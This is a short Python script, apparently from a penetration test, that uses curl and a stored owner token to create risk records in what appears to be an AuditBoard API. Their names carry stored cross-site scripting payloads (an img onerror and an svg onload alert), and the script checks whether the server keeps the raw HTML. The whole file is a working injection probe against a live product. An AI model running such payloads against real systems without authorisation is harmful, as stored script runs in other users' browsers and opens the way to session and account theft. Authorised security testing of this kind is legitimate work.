import json,subprocess,os,uuid
H=os.environ['H']; BB=os.environ['BB']
TOK=open('/tmp/bac_OWNER').read().strip()
def call(m,p,body=None):
    cmd=['curl','-s','-m','25','-o','/tmp/hb','-w','%{http_code}','-X',m,H+p,
         '-H','token: '+TOK,'-H',BB,'-H','Content-Type: application/json',
         '-H','X-Auditboard-Product: System']
    if body is not None: cmd+=['-d',json.dumps(body)]
    c=subprocess.run(cmd,capture_output=True,text=True).stdout.strip()
    return c, open('/tmp/hb',encoding='utf-8',errors='replace').read()
tag='ZXR'+uuid.uuid4().hex[:6]
print("=== create risk with HTML payload (raw-storage test) ===")
for label,pay in [('img',f'<img src=x onerror=alert(document.domain)>{tag}'),
                  ('svg',f'<svg onload=alert(1)>{tag}'),
                  ('plain',f'ZXPLAIN{tag}')]:
    c,b=call('POST','/api/v1/risks',{"risk":{"name":pay}})
    print(f"  {label:6} create -> {c} {b[:100].replace(chr(10),' ')}")
    if c in ('200','201'):
        try:
            o=json.loads(b)['risks'][0]
            print(f"     id={o['id']} stored={o.get('name')!r}")
            print(f"     RAW_HTML={'<img' in str(o.get('name')) or '<svg' in str(o.get('name'))}")
            open(f'/tmp/risk_{label}','w').write(str(o['id']))
        except Exception as e: print("     parse",e)
